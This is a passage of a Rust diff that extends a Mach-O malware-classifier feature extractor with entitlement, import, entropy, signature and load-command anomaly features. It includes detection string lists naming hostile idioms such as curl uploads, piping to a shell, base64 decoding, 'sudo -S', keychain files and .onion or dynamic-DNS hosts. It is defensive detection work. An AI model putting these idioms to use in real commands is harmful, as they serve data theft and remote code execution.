@@ -27,7 +27,7 @@ use std::collections::BTreeSet;
 use std::sync::OnceLock;
 
 /// Version of the feature layout. Bump on any change of order, meaning or count.
-pub const FEATURES_VERSION: u32 = 1;
+pub const FEATURES_VERSION: u32 = 2;
 
 /// Counts are capped to this value.
 const COUNT_CAP: u64 = 100_000;
@@ -200,6 +200,84 @@ define_features! {
     StrGatekeeper => "str_gatekeeper": "\"spctl\", \"master-disable\", \"csrutil\"",
     StrTcc => "str_tcc": "\"TCC.db\", \"com.apple.TCC\", \"tccutil\"",
     StrLoginItems => "str_login_items": "\"login item\", \"LoginItems\"",
+    // ===== v2 =====================================================================================
+    // --- entitlements risk --------------------------------------------------------------------
+    EntRiskScore => "ent_risk_score": "weighted sum of risky entitlement keys (ENTITLEMENT_RISK: exec-page-protection 4, library-validation / dyld-env / unsigned-exec-memory 3, get-task-allow / debugger / apple-events / each com.apple.private.* 2, jit / TCC resources / temporary-exception 1)",
+    EntPrivateKeys => "ent_private_keys": "number of com.apple.private.* entitlement keys (Apple-only, never legitimate in third-party code)",
+    EntAppleEvents => "ent_apple_events": "entitlement com.apple.security.automation.apple-events",
+    EntTccResources => "ent_tcc_resources": "camera / audio-input / location / addressbook / calendars / photos-library entitlements",
+    EntTempExceptions => "ent_temporary_exceptions": "sandbox temporary-exception entitlement keys",
+    EntDisableExecPageProt => "ent_disable_exec_page_protection": "entitlement cs.disable-executable-page-protection",
+    EntNetwork => "ent_network": "entitlement network.client or network.server",
+    EntDerOnly => "ent_der_only": "DER entitlements blob without the XML form",
+    // --- more import families -----------------------------------------------------------------
+    ImpTcc => "imp_tcc": "TCCAccessRequest/Preflight, CNContactStore, EKEventStore, PHPhotoLibrary, CLLocationManager, AVAudioRecorder, AudioQueueNewInput",
+    ImpAppleEvents => "imp_apple_events": "AECreateAppleEvent, AESend*, AEDeterminePermissionToAutomateTarget, NSAppleEventDescriptor, NSAppleEventManager, OSAKit/NSAppleScript",
+    ImpMemExec => "imp_mem_exec": "mmap, mprotect, vm_protect, vm_allocate, mach_vm_allocate/map/protect, pthread_jit_write_protect_np, sys_icache_invalidate",
+    ImpEnv => "imp_env": "getenv, setenv, unsetenv, putenv, _NSGetEnviron",
+    ImpObjcRuntime => "imp_objc_runtime": "objc_getClass, objc_lookUpClass, NSClassFromString, NSSelectorFromString, sel_registerName, sel_getUid, class_getMethodImplementation, method_exchangeImplementations, class_replaceMethod, method_setImplementation",
+    ImpFileDelete => "imp_file_delete": "unlink, unlinkat, remove, removefile, rmdir, rename, renamex_np, copyfile, clonefile, truncate",
+    ImpCodeSigningApi => "imp_code_signing_api": "SecCodeCopySelf, SecCodeCopySigningInformation, SecStaticCodeCreateWithPath, SecCodeCheckValidity, SecStaticCodeCheckValidity, SecRequirementCreateWithString",
+    // --- structural strings ---------------------------------------------------------------------
+    StrUrlHosts => "str_url_hosts": "distinct hosts of http(s) URLs (capped at 1000)",
+    StrUrlIp => "str_url_ip": "http(s) URLs whose host is an IPv4 literal",
+    StrUrlNonstdPort => "str_url_nonstd_port": "http(s) URLs with an explicit port other than 80/443",
+    StrIpv4 => "str_ipv4": "IPv4 literals (four dot-separated numbers <= 255) in printable runs",
+    StrB64Blobs => "str_b64_blobs": "runs of >= 64 base64 characters mixing upper case, lower case and digits",
+    StrB64MaxLog2 => "str_b64_max_log2": "log2(1 + longest such base64 run)",
+    StrHexBlobs => "str_hex_blobs": "runs of >= 64 hexadecimal digits",
+    StrMaxRunLog2 => "str_max_run_log2": "log2(1 + longest printable ASCII run)",
+    StrOsascriptE => "str_osascript_e": "\"osascript -e\", \"osascript -l\"",
+    StrDsclAuthonly => "str_dscl_authonly": "\"-authonly\"",
+    StrUserAgent => "str_user_agent": "\"Mozilla/5.0\"",
+    StrCurlUpload => "str_curl_upload": "\"curl -F\", \"--data-binary\", \"--upload-file\", \"-X POST\"",
+    StrPipeShell => "str_pipe_shell": "\"| sh\", \"| bash\", \"| zsh\", \"|sh\", \"|bash\", \"|zsh\"",
+    StrDecodeCmd => "str_decode_cmd": "\"base64 -d\", \"base64 --decode\", \"base64 -D\", \"xxd -r\", \"openssl enc -d\"",
+    StrSudoStdin => "str_sudo_stdin": "\"sudo -S\"",
+    StrKeychainDb => "str_keychain_db": "\"login.keychain\", \"keychain-db\"",
+    StrOnionDyndns => "str_onion_dyndns": "\".onion\", \"duckdns\", \"no-ip.\", \"ddns.net\", \"trycloudflare\"",
+    StrHiddenPath => "str_hidden_path": "\"/Users/Shared/.\", \"/tmp/.\", \"/private/tmp/.\", \"/var/tmp/.\"",
+    // --- section entropy statistics -------------------------------------------------------------
+    EntropyMeanSection => "entropy_mean_section": "mean entropy over sections of at least 256 bytes",
+    EntropyStdSection => "entropy_std_section": "standard deviation of the entropy over sections of at least 256 bytes",
+    EntropyCstring => "entropy_cstring": "entropy of __TEXT,__cstring",
+    EntropyConst => "entropy_const": "entropy of __TEXT,__const",
+    HighEntropyRatio => "high_entropy_ratio": "bytes of sections (>= 1 KiB) with entropy > 7.2 / bytes of all sections",
+    EntropyOverlay => "entropy_overlay": "entropy of the overlay (0 when shorter than 256 bytes)",
+    NCodeSectionsOutsideText => "n_code_sections_outside_text": "sections with instruction attributes outside __TEXT* segments",
+    // --- code signature (v2) --------------------------------------------------------------------
+    CsSecureTimestamp => "cs_secure_timestamp": "CMS signature carries a secure timestamp",
+    CsDeveloperId => "cs_developer_id": "certificates mention Developer ID Application",
+    CsAppleDevelopment => "cs_apple_development_cert": "certificates mention Apple Development / Mac Developer (development-only identity)",
+    CsAppStore => "cs_app_store": "certificates mention Apple Mac OS Application Signing (Mac App Store)",
+    CsAppleSoftware => "cs_apple_software_signing": "certificates mention Software Signing (Apple platform binary)",
+    CsNotarizationCapable => "cs_notarization_capable": "Developer ID + hardened runtime + secure timestamp + team id, not ad-hoc (what notarization requires)",
+    CsSha1Only => "cs_sha1_only": "single CodeDirectory hashed with SHA-1",
+    CsHardeningFlags => "cs_hardening_flags": "number of CS_HARD, CS_KILL, CS_RESTRICT, CS_REQUIRE_LV flags",
+    CsNCodeDirectories => "cs_n_code_directories": "number of CodeDirectories (primary + alternates)",
+    CsIdentReverseDns => "cs_ident_reverse_dns": "signing identifier looks like a reverse-DNS id (>= 2 dots, no spaces)",
+    CsIdentHexish => "cs_ident_hexish": "signing identifier contains >= 16 consecutive hex digits (tool-generated)",
+    CsNotAtLinkeditEnd => "cs_not_at_linkedit_end": "code signature does not end where __LINKEDIT ends (appended data or tampering)",
+    // --- load command anomalies -----------------------------------------------------------------
+    LcDuplicateDylibs => "lc_duplicate_dylibs": "dylib paths loaded more than once (extra occurrences)",
+    LcWeakNonsystem => "lc_weak_nonsystem_dylibs": "weak dylibs that are @-relative or outside /usr/lib and /System (hijack vector)",
+    LcRpathAbsNonsystem => "lc_rpath_absolute_nonsystem": "LC_RPATH absolute paths outside /usr/lib and /System",
+    LcDylinkerNonstd => "lc_dylinker_nonstandard": "LC_LOAD_DYLINKER other than /usr/lib/dyld",
+    LcDyldEnvironment => "lc_dyld_environment": "LC_DYLD_ENVIRONMENT commands",
+    LcNoUuid => "lc_no_uuid": "no LC_UUID",
+    LcSegmentsOverlap => "lc_segments_overlap": "pairs of segments whose file ranges overlap",
+    LcSectionsOob => "lc_sections_out_of_bounds": "non-zerofill sections extending beyond the slice",
+    LcEntryOutsideText => "lc_entry_outside_text": "LC_MAIN entry offset outside the __TEXT file range",
+    LcMisalignedCmds => "lc_misaligned_cmds": "load commands whose cmdsize is not a multiple of 8 (64-bit) / 4 (32-bit)",
+    LcSizeofcmdsMismatch => "lc_sizeofcmds_mismatch": "header sizeofcmds differs from the sum of the cmdsize fields",
+    // --- universal binary consistency -----------------------------------------------------------
+    FatNParsed => "fat_n_parsed_slices": "slices that parse as Mach-O (1 for a parsable thin binary)",
+    FatFiletypeMismatch => "fat_filetype_mismatch": "parsed slices do not all have the same file type",
+    FatSignatureMismatch => "fat_signature_mismatch": "slices differ in signature presence, ad-hoc flag, team id or identifier",
+    FatSizeRatio => "fat_size_ratio": "smallest / largest slice size (1 for a thin binary)",
+    FatUnknownCputype => "fat_unknown_cputype": "slices with an unknown CPU type",
+    FatOverlap => "fat_overlapping_slices": "pairs of slices overlapping each other or the fat header",
+    FatNcmdsSpread => "fat_ncmds_spread": "max - min load command count across parsed slices",
 }
 
 /// Names of the features, in vector order (the trainer's column names).
@@ -307,7 +385,71 @@ const STRING_PATTERNS: &[(&str, F)] = &[
     ("tccutil", F::StrTcc),
     ("login item", F::StrLoginItems),
     ("LoginItems", F::StrLoginItems),
+    // v2
+    ("osascript -e", F::StrOsascriptE),
+    ("osascript -l", F::StrOsascriptE),
+    ("-authonly", F::StrDsclAuthonly),
+    ("Mozilla/5.0", F::StrUserAgent),
+    ("curl -F", F::StrCurlUpload),
+    ("--data-binary", F::StrCurlUpload),
+    ("--upload-file", F::StrCurlUpload),
+    ("-X POST", F::StrCurlUpload),
+    ("| sh", F::StrPipeShell),
+    ("| bash", F::StrPipeShell),
+    ("| zsh", F::StrPipeShell),
+    ("|sh", F::StrPipeShell),
+    ("|bash", F::StrPipeShell),
+    ("|zsh", F::StrPipeShell),
+    ("base64 -d", F::StrDecodeCmd),
+    ("base64 --decode", F::StrDecodeCmd),
+    ("xxd -r", F::StrDecodeCmd),
+    ("openssl enc -d", F::StrDecodeCmd),
+    ("sudo -S", F::StrSudoStdin),
+    ("login.keychain", F::StrKeychainDb),
+    ("keychain-db", F::StrKeychainDb),
+    (".onion", F::StrOnionDyndns),
+    ("duckdns", F::StrOnionDyndns),
+    ("no-ip.", F::StrOnionDyndns),
+    ("ddns.net", F::StrOnionDyndns),
+    ("trycloudflare", F::StrOnionDyndns),
+    ("/Users/Shared/.", F::StrHiddenPath),
+    ("/tmp/.", F::StrHiddenPath),
+    ("/private/tmp/.", F::StrHiddenPath),
+    ("/var/tmp/.", F::StrHiddenPath),
 ];
+
+/// Entitlement key fragments and their risk weight (`ent_risk_score`). Matched inside `<key>…</key>`.
+const ENTITLEMENT_RISK: &[(&str, f32)] = &[
+    (
+        "com.apple.security.cs.disable-executable-page-protection",
+        4.0,
+    ),
+    ("com.apple.security.cs.disable-library-validation", 3.0),
+    (
+        "com.apple.security.cs.allow-dyld-environment-variables",
+        3.0,
+    ),
+    (
+        "com.apple.security.cs.allow-unsigned-executable-memory",
+        3.0,
+    ),
+    ("com.apple.security.get-task-allow", 2.0),
+    ("com.apple.security.cs.debugger", 2.0),
+    ("com.apple.security.automation.apple-events", 2.0),
+    ("com.apple.security.cs.allow-jit", 1.0),
+];
+const ENT_TCC: &[&str] = &[
+    "com.apple.security.device.camera",
+    "com.apple.security.device.audio-input",
+    "com.apple.security.device.microphone",
+    "com.apple.security.personal-information.location",
+    "com.apple.security.personal-information.addressbook",
+    "com.apple.security.personal-information.calendars",
+    "com.apple.security.personal-information.photos-library",
+];
+/// Weight of each `com.apple.private.*` key, TCC resource key and temporary exception.
+const ENT_PRIVATE_WEIGHT: f32 = 2.0;
+const ENT_MINOR_WEIGHT: f32 = 1.0;
 
 /// Import families: exact names, or prefixes when the pattern ends with `*`.
 const IMPORT_FAMILIES: &[(F, &[&str])] = &[
@@ -499,6 +641,92 @@ const IMPORT_FAMILIES: &[(F, &[&str])] = &[
             "SCDynamicStoreCopyComputerName",
         ],
     ),
+    // v2
+    (
+        F::ImpTcc,
+        &[
+            "TCCAccessRequest",
+            "TCCAccessPreflight",
+            "CNContactStore",
+            "EKEventStore",
+            "PHPhotoLibrary",
+            "CLLocationManager",
+            "AVAudioRecorder",
+            "AudioQueueNewInput",
+        ],
+    ),
+    (
+        F::ImpAppleEvents,
+        &[
+            "AECreateAppleEvent",
+            "AESend*",
+            "AEDeterminePermissionToAutomateTarget",
+            "NSAppleEventDescriptor",
+            "NSAppleEventManager",
+            "NSAppleScript",
+            "OSAScript",
+            "OSALanguage",
+        ],
+    ),
+    (
+        F::ImpMemExec,
+        &[
+            "mmap",
+            "mprotect",
+            "vm_protect",
+            "vm_allocate",
+            "mach_vm_allocate",
+            "mach_vm_map",
+            "mach_vm_protect",
+            "pthread_jit_write_protect_np",
+            "sys_icache_invalidate",
+        ],
+    ),
+    (
+        F::ImpEnv,
+        &["getenv", "setenv", "unsetenv", "putenv", "_NSGetEnviron"],
+    ),
+    (
+        F::ImpObjcRuntime,
+        &[
+            "objc_getClass",
+            "objc_lookUpClass",
+            "NSClassFromString",
+            "NSSelectorFromString",
+            "sel_registerName",
+            "sel_getUid",
+            "class_getMethodImplementation",
+            "method_exchangeImplementations",
+            "class_replaceMethod",
+            "method_setImplementation",
+        ],
+    ),
+    (
+        F::ImpFileDelete,
+        &[
+            "unlink",
+            "unlinkat",
+            "remove",
+            "removefile",
+            "rmdir",
+            "rename",
+            "renamex_np",
+            "copyfile",
+            "clonefile",
+            "truncate",
+        ],
+    ),
+    (
+        F::ImpCodeSigningApi,
+        &[
+            "SecCodeCopySelf",
+            "SecCodeCopySigningInformation",
+            "SecStaticCodeCreateWithPath",
+            "SecCodeCheckValidity",
+            "SecStaticCodeCheckValidity",
+            "SecRequirementCreateWithString",
+        ],
+    ),
 ];
 
 const STANDARD_SEGMENTS: &[&str] = &[
@@ -649,9 +877,11 @@ fn extract_inner(bytes: &[u8]) -> Result<Vec<f32>, MlError> {
     );
 
     let (_slice, data, m) = macho::select_slice(bytes, &slices)?;
+    fat_features(&mut fv, bytes, &slices, is_fat);
     header_features(&mut fv, data, &m);
     let sections = segment_features(&mut fv, data, &m);
     load_command_features(&mut fv, data, &m);
+    raw_command_features(&mut fv, data, &m);
     let sig = codesig::summary_for(data, &m);
     signature_features(&mut fv, &sig);
     let imports = collect_imports(data, &m);
@@ -693,7 +923,19 @@ struct SectionInfo<'a> {
     segname: String,
     sectname: String,
     data: &'a [u8],
+    flags: u32,
+    offset: u64,
+    size: u64,
 }
+
+const SECTION_TYPE: u32 = 0xff;
+const S_ZEROFILL: u32 = 0x1;
+const S_GB_ZEROFILL: u32 = 0xc;
+const S_THREAD_LOCAL_ZEROFILL: u32 = 0x12;
+const S_ATTR_PURE_INSTRUCTIONS: u32 = 0x8000_0000;
+const S_ATTR_SOME_INSTRUCTIONS: u32 = 0x400;
+/// Max segments compared pairwise for overlaps.
+const MAX_OVERLAP_SEGMENTS: usize = 64;
 
 fn segment_features<'a>(fv: &mut Fv, data: &'a [u8], m: &MachO<'a>) -> Vec<SectionInfo<'a>> {
     let mut sections = Vec::new();
@@ -742,6 +984,9 @@ fn segment_features<'a>(fv: &mut Fv, data: &'a [u8], m: &MachO<'a>) -> Vec<Secti
                 segname: name_str(&s.segname).to_owned(),
                 sectname: name_str(&s.sectname).to_owned(),
                 data: content,
+                flags: s.flags,
+                offset: u64::from(s.offset),
+                size: s.size,
             });
         }
     }
@@ -759,24 +1004,90 @@ fn segment_features<'a>(fv: &mut Fv, data: &'a [u8], m: &MachO<'a>) -> Vec<Secti
     fv.set(F::EntropyData, entropy_of(&data_hist, data_total));
     fv.log2(F::LinkeditSizeLog2, linkedit);
     fv.log2(F::OverlayLog2, (data.len() as u64).saturating_sub(max_end));
+    if let Some(overlay) = usize::try_from(max_end)
+        .ok()
+        .and_then(|e| data.get(e..))
+        .filter(|o| o.len() >= MIN_ENTROPY_SECTION)
+    {
+        fv.set(F::EntropyOverlay, entropy(overlay));
+    }
+
+    // Overlapping file ranges between segments (pairwise, bounded).
+    let ranges: Vec<(u64, u64)> = m
+        .segments
+        .iter()
+        .filter(|s| s.filesize > 0)
+        .take(MAX_OVERLAP_SEGMENTS)
+        .map(|s| (s.fileoff, s.fileoff.saturating_add(s.filesize)))
+        .collect();
+    let mut overlaps = 0u64;
+    for (i, a) in ranges.iter().enumerate() {
+        for b in &ranges[i + 1..] {
+            if a.0 < b.1 && b.0 < a.1 {
+                overlaps += 1;
+            }
+        }
+    }
+    fv.count(F::LcSegmentsOverlap, overlaps);
 
     let mut max_entropy = 0f32;
     let mut high = 0u64;
+    let mut entropies: Vec<f64> = Vec::new();
+    let (mut total_bytes, mut high_bytes) = (0u64, 0u64);
+    let (mut code_outside_text, mut oob) = (0u64, 0u64);
     for s in &sections {
+        let stype = s.flags & SECTION_TYPE;
+        let zerofill = matches!(stype, S_ZEROFILL | S_GB_ZEROFILL | S_THREAD_LOCAL_ZEROFILL);
+        if !zerofill && s.size > 0 && s.offset.saturating_add(s.size) > data.len() as u64 {
+            oob += 1;
+        }
+        if s.flags & (S_ATTR_PURE_INSTRUCTIONS | S_ATTR_SOME_INSTRUCTIONS) != 0
+            && !s.segname.starts_with("__TEXT")
+        {
+            code_outside_text += 1;
+        }
         if s.segname == "__TEXT" && s.sectname == "__text" {
             fv.log2(F::TextSizeLog2, s.data.len() as u64);
             fv.set(F::EntropyText, entropy(s.data));
         }
+        total_bytes += s.data.len() as u64;
         if s.data.len() >= MIN_ENTROPY_SECTION {
             let e = entropy(s.data);
+            entropies.push(f64::from(e));
             max_entropy = max_entropy.max(e);
             if s.data.len() >= 1024 && e > 7.2 {
                 high += 1;
+                high_bytes += s.data.len() as u64;
+            }
+            if s.segname == "__TEXT" && s.sectname == "__cstring" {
+                fv.set(F::EntropyCstring, e);
+            }
+            if s.segname == "__TEXT" && s.sectname == "__const" {
+                fv.set(F::EntropyConst, e);
             }
         }
     }
     fv.set(F::EntropyMaxSection, max_entropy);
     fv.count(F::NHighEntropySections, high);
+    if !entropies.is_empty() {
+        let n = entropies.len() as f64;
+        let mean = entropies.iter().sum::<f64>() / n;
+        let var = entropies
+            .iter()
+            .map(|e| (e - mean) * (e - mean))
+            .sum::<f64>()
+            / n;
+        fv.set(F::EntropyMeanSection, mean as f32);
+        fv.set(F::EntropyStdSection, var.sqrt() as f32);
+    }
+    if total_bytes > 0 {
+        fv.set(
+            F::HighEntropyRatio,
+            (high_bytes as f64 / total_bytes as f64) as f32,
+        );
+    }
+    fv.count(F::NCodeSectionsOutsideText, code_outside_text);
+    fv.count(F::LcSectionsOob, oob);
     fv.flag(
         F::HasObjc,
         sections.iter().any(|s| s.sectname.starts_with("__objc_")),
@@ -809,6 +1120,10 @@ fn load_command_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
         (0u64, 0u64, 0u64, 0u64, 0u64);
     let mut libs: Vec<&str> = Vec::new();
     let mut unknown = 0u64;
+    let (mut weak_nonsys, mut dyld_env) = (0u64, 0u64);
+    let mut has_uuid = false;
+    let mut entryoff: Option<u64> = None;
+    let mut sig_range: Option<(u64, u64)> = None;
     for lc in &m.load_commands {
         match &lc.command {
             CommandVariant::LoadDylib(c)
@@ -823,14 +1138,30 @@ fn load_command_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
                     _ => {}
                 }
                 let name = dylib_name(data, lc.offset, c.dylib.name);
+                let system = name.starts_with("/usr/lib/") || name.starts_with("/System/");
                 if name.starts_with('@') {
                     n_rel += 1;
-                } else if !(name.starts_with("/usr/lib/") || name.starts_with("/System/")) {
+                } else if !system {
                     n_nonsys += 1;
+                }
+                if matches!(lc.command, CommandVariant::LoadWeakDylib(_)) && !system {
+                    weak_nonsys += 1;
                 }
                 libs.push(name);
             }
-            CommandVariant::Main(_) => fv.flag(F::HasMain, true),
+            CommandVariant::Main(c) => {
+                fv.flag(F::HasMain, true);
+                entryoff = Some(c.entryoff);
+            }
+            CommandVariant::LoadDylinker(c) => {
+                let name = dylib_name(data, lc.offset, c.name);
+                fv.flag(F::LcDylinkerNonstd, name != "/usr/lib/dyld");
+            }
+            CommandVariant::DyldEnvironment(_) => dyld_env += 1,
+            CommandVariant::Uuid(_) => has_uuid = true,
+            CommandVariant::CodeSignature(c) => {
+                sig_range = Some((u64::from(c.dataoff), u64::from(c.datasize)));
+            }
             CommandVariant::Unixthread(_) => fv.flag(F::HasUnixthread, true),
             CommandVariant::DyldInfo(_) | CommandVariant::DyldInfoOnly(_) => {
                 fv.flag(F::HasDyldInfo, true)
@@ -867,6 +1198,34 @@ fn load_command_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
     fv.count(F::NDylibsRelative, n_rel);
     fv.count(F::NDylibsNonSystem, n_nonsys);
     fv.count(F::NUnknownCmds, unknown);
+    let mut seen = BTreeSet::new();
+    let dups = libs.iter().filter(|l| !seen.insert(**l)).count() as u64;
+    fv.count(F::LcDuplicateDylibs, dups);
+    fv.count(F::LcWeakNonsystem, weak_nonsys);
+    fv.count(F::LcDyldEnvironment, dyld_env);
+    fv.flag(F::LcNoUuid, !has_uuid);
+    fv.count(
+        F::LcRpathAbsNonsystem,
+        m.rpaths
+            .iter()
+            .filter(|r| {
+                r.starts_with('/') && !(r.starts_with("/usr/lib/") || r.starts_with("/System/"))
+            })
+            .count() as u64,
+    );
+    let segment_range = |name: &str| {
+        m.segments
+            .iter()
+            .find(|s| name_str(&s.segname) == name)
+            .map(|s| (s.fileoff, s.fileoff.saturating_add(s.filesize)))
+    };
+    if let Some(off) = entryoff {
+        let inside = segment_range("__TEXT").is_some_and(|(a, b)| off >= a && off < b);
+        fv.flag(F::LcEntryOutsideText, !inside);
+    }
+    if let (Some((off, size)), Some((_, le_end))) = (sig_range, segment_range("__LINKEDIT")) {
+        fv.flag(F::CsNotAtLinkeditEnd, off.saturating_add(size) != le_end);
+    }
     let links = |needles: &[&str]| libs.iter().any(|l| needles.iter().any(|n| l.contains(n)));
     fv.flag(F::LinksSecurity, links(&["/Security.framework/"]));
     fv.flag(F::LinksIokit, links(&["/IOKit.framework/"]));
@@ -882,7 +1241,194 @@ fn load_command_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
     );
 }
 
+/// Walks the raw load-command headers (cmd, cmdsize) independently of goblin.
+fn raw_command_features(fv: &mut Fv, data: &[u8], m: &MachO<'_>) {
+    let le = m.little_endian;
+    let (header, align) = if m.is_64 {
+        (32usize, 8u32)
+    } else {
+        (28usize, 4u32)
+    };
+    let ncmds = m.header.ncmds.min(4096);
+    let mut off = header;
+    let (mut sum, mut misaligned) = (0u64, 0u64);
+    for _ in 0..ncmds {
+        let Some(size) = macho::read_u32(data, off + 4, le) else {
+            break;
+        };
+        if size < 8 {
+            break;
+        }
+        if size % align != 0 {
+            misaligned += 1;
+        }
+        sum += u64::from(size);
+        off = match off.checked_add(size as usize) {
+            Some(o) if o <= data.len() => o,
+            _ => break,
+        };
+    }
+    fv.count(F::LcMisalignedCmds, misaligned);
+    fv.flag(
+        F::LcSizeofcmdsMismatch,
+        sum != u64::from(m.header.sizeofcmds),
+    );
+}
+
+/// Max slices of a universal binary parsed for the consistency features.
+const MAX_FAT_PARSED: usize = 8;
+
+/// Consistency of the slices of a universal binary (thin binaries get the neutral values).
+fn fat_features(fv: &mut Fv, bytes: &[u8], slices: &[FatSlice], is_fat: bool) {
+    let sizes: Vec<usize> = slices.iter().map(|s| s.size).collect();
+    let (min, max) = (
+        sizes.iter().copied().min().unwrap_or(0),
+        sizes.iter().copied().max().unwrap_or(0),
+    );
+    fv.set(
+        F::FatSizeRatio,
+        if max > 0 {
+            min as f32 / max as f32
+        } else {
+            0.0
+        },
+    );
+    if !is_fat {
+        fv.count(F::FatNParsed, 1);
+        return;
+    }
+    fv.count(
+        F::FatUnknownCputype,
+        slices
+            .iter()
+            .filter(|s| !macho::is_known_cputype(s.cputype))
+            .count() as u64,
+    );
+    let entry = if bytes.get(0..4) == Some(&[0xca, 0xfe, 0xba, 0xbf][..]) {
+        32
+    } else {
+        20
+    };
+    let header_end = 8 + slices.len() * entry;
+    let mut overlaps = 0u64;
+    for (i, a) in slices.iter().enumerate() {
+        let a_end = a.offset.saturating_add(a.size);
+        if a.offset < header_end {
+            overlaps += 1;
+        }
+        for b in &slices[i + 1..] {
+            if a.offset < b.offset.saturating_add(b.size) && b.offset < a_end {
+                overlaps += 1;
+            }
+        }
+    }
+    fv.count(F::FatOverlap, overlaps);
+    type SigKey = (bool, bool, Option<String>, Option<String>);
+    let mut filetypes = BTreeSet::new();
+    let mut sigs: BTreeSet<SigKey> = BTreeSet::new();
+    let mut ncmds: Vec<u32> = Vec::new();
+    for s in slices.iter().take(MAX_FAT_PARSED) {
+        let Some(d) = s.bytes(bytes) else { continue };
+        let Ok(m) = MachO::parse_lossy(d, 0) else {
+            continue;
+        };
+        filetypes.insert(m.header.filetype);
+        ncmds.push(m.header.ncmds as u32);
+        let sig = codesig::summary_for(d, &m);
+        sigs.insert((sig.present, sig.adhoc, sig.team_id, sig.identifier));
+    }
+    fv.count(F::FatNParsed, ncmds.len() as u64);
+    fv.flag(F::FatFiletypeMismatch, filetypes.len() > 1);
+    fv.flag(F::FatSignatureMismatch, sigs.len() > 1);
+    if let (Some(lo), Some(hi)) = (ncmds.iter().min(), ncmds.iter().max()) {
+        fv.count(F::FatNcmdsSpread, u64::from(hi - lo));
+    }
+}
+
+const CS_HARD: u32 = 0x100;
+const CS_KILL: u32 = 0x200;
+const CS_RESTRICT: u32 = 0x800;
+const CS_REQUIRE_LV: u32 = 0x2000;
+
+fn has_hex_run(s: &str, min: usize) -> bool {
+    let mut run = 0usize;
+    for b in s.bytes() {
+        if b.is_ascii_hexdigit() {
+            run += 1;
+            if run >= min {
+                return true;
+            }
+        } else {
+            run = 0;
+        }
+    }
+    false
+}
+
+fn signature_features_v2(fv: &mut Fv, s: &CodeSignatureSummary) {
+    fv.flag(F::CsSecureTimestamp, s.cms_timestamp);
+    fv.flag(F::CsDeveloperId, s.cms_developer_id);
+    fv.flag(F::CsAppleDevelopment, s.cms_apple_development);
+    fv.flag(F::CsAppStore, s.cms_app_store);
+    fv.flag(F::CsAppleSoftware, s.cms_apple_software);
+    fv.flag(
+        F::CsNotarizationCapable,
+        s.cms_developer_id && s.runtime && s.cms_timestamp && s.team_id.is_some() && !s.adhoc,
+    );
+    fv.flag(
+        F::CsSha1Only,
+        s.present && s.hash_type == 1 && s.code_directories <= 1,
+    );
+    let hardening = [CS_HARD, CS_KILL, CS_RESTRICT, CS_REQUIRE_LV]
+        .iter()
+        .filter(|f| s.flags & **f != 0)
+        .count() as u64;
+    fv.count(F::CsHardeningFlags, hardening);
+    fv.count(F::CsNCodeDirectories, u64::from(s.code_directories));
+    if let Some(id) = &s.identifier {
+        fv.flag(
+            F::CsIdentReverseDns,
+            id.matches('.').count() >= 2 && !id.contains(' '),
+        );
+        fv.flag(F::CsIdentHexish, has_hex_run(id, 16));
+    }
+    fv.flag(
+        F::EntDerOnly,
+        s.der_entitlements && s.entitlements.is_none(),
+    );
+    let Some(x) = &s.entitlements else { return };
+    let key = |k: &str| x.contains(&format!("<key>{k}</key>"));
+    let mut risk = 0f32;
+    for (k, w) in ENTITLEMENT_RISK {
+        if key(k) {
+            risk += w;
+        }
+    }
+    let private = x.matches("<key>com.apple.private.").count() as u64;
+    let tcc = ENT_TCC.iter().filter(|k| key(k)).count() as u64;
+    let temp = x.matches("temporary-exception").count() as u64;
+    risk += ENT_PRIVATE_WEIGHT * private.min(10) as f32
+        + ENT_MINOR_WEIGHT * (tcc + temp.min(10)) as f32;
+    fv.set(F::EntRiskScore, risk);
+    fv.count(F::EntPrivateKeys, private);
+    fv.flag(
+        F::EntAppleEvents,
+        key("com.apple.security.automation.apple-events"),
+    );
+    fv.count(F::EntTccResources, tcc);
+    fv.count(F::EntTempExceptions, temp);
+    fv.flag(
+        F::EntDisableExecPageProt,
+        key("com.apple.security.cs.disable-executable-page-protection"),
+    );
+    fv.flag(
+        F::EntNetwork,
+        key("com.apple.security.network.client") || key("com.apple.security.network.server"),
+    );
+}
+
 fn signature_features(fv: &mut Fv, s: &CodeSignatureSummary) {
+    signature_features_v2(fv, s);
     fv.flag(F::HasCodeSig, s.present);
     fv.log2(F::CodeSigSizeLog2, u64::from(s.size));
     fv.flag(F::CsAdhoc, s.adhoc);
@@ -1063,6 +1609,7 @@ fn string_features(fv: &mut Fv, data: &[u8], sections: &[SectionInfo<'_>]) {
     fv.log2(F::StringsBytesLog2, scanned as u64);
 
     let mut printable = 0u64;
+    let mut st = StructStats::default();
     for c in &chunks {
         let mut run = 0usize;
         for &b in c.iter() {
@@ -1072,24 +1619,56 @@ fn string_features(fv: &mut Fv, data: &[u8], sections: &[SectionInfo<'_>]) {
                 if run >= 6 {
                     printable += 1;
                 }
+                st.max_run = st.max_run.max(run);
                 run = 0;
             }
         }
         if run >= 6 {
             printable += 1;
         }
+        st.max_run = st.max_run.max(run);
+        st.scan(c);
     }
     fv.log2(F::NPrintableLog2, printable);
+    fv.log2(F::StrMaxRunLog2, st.max_run as u64);
+    fv.count(F::StrIpv4, st.ipv4);
+    fv.count(F::StrB64Blobs, st.b64_blobs);
+    fv.log2(F::StrB64MaxLog2, st.b64_max as u64);
+    fv.count(F::StrHexBlobs, st.hex_blobs);
 
     let Some(ac) = string_automaton() else { return };
     let mut counts = vec![0u64; STRING_PATTERNS.len()];
+    let mut hosts: BTreeSet<&[u8]> = BTreeSet::new();
+    let (mut url_ip, mut url_port) = (0u64, 0u64);
     for c in &chunks {
         for mat in ac.find_overlapping_iter(*c) {
-            if let Some(slot) = counts.get_mut(mat.pattern().as_usize()) {
+            let pid = mat.pattern().as_usize();
+            if let Some(slot) = counts.get_mut(pid) {
                 *slot += 1;
+            }
+            if matches!(
+                STRING_PATTERNS.get(pid).map(|p| p.1),
+                Some(F::StrHttp) | Some(F::StrHttps)
+            ) {
+                let (host, port) = url_host(&c[mat.end()..]);
+                if host.is_empty() {
+                    continue;
+                }
+                if is_ipv4(host) {
+                    url_ip += 1;
+                }
+                if port.is_some_and(|p| p != b"80" && p != b"443") {
+                    url_port += 1;
+                }
+                if hosts.len() < MAX_URL_HOSTS {
+                    hosts.insert(host);
+                }
             }
         }
     }
+    fv.count(F::StrUrlHosts, hosts.len() as u64);
